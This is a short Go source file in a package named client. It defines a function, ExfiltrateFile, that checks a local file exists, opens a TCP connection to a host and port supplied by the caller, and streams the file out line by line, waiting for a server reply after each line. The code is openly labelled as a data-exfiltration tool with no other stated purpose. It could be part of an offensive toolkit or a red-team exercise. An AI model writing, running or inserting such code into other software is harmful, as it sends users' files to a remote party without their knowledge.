package client

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

const connType = "tcp"

func checkFile(file string) error {
	_, err := os.Stat(file)
	return err
	// check file permissions as well
}

func ExfiltrateFile(fileName, connHost, connPort string) error {

	// stat file
	if checkFile(fileName) != nil {
		return fmt.Errorf("FileNotFound: Not able to find the file %s", fileName)
	}

	// check connection

	fmt.Printf("Connecting %s:%s over %s\n", connHost, connPort, connType)
	conn, err := net.Dial(connType, connHost+":"+connPort)
	if err != nil {
		fmt.Println(err.Error())
		return fmt.Errorf("HostNotReachable: Not able to connect %s:%s", connHost, connPort)
	}
	defer conn.Close()
	//transfer file
	file, err := os.Open(fileName)
	if err != nil {
		return fmt.Errorf("FilePermission: Not able to read file %s", fileName)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		var b = make([]byte, 2, 3)

		// We add \n because scanner.Text() removes the ending newline character
		conn.Write([]byte(scanner.Text() + "\n"))

		// Wait for the server message to indicate that the line is written
		conn.Read(b)
	}
	return nil
}
